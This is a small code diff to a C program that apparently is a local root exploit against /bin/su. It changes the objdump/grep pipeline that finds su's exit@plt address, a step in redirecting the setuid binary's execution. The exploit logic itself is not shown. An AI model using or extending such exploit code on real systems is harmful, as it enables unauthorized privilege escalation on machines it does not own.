@@ -136,7 +136,7 @@ int main(int argc, char **argv)
 		else {
 			printf("[+] Reading su for exit@plt.\n");
 			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
-			FILE *command = popen("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
+			FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
 			char result[32];
 			result[0] = 0;
 			fgets(result, 32, command);
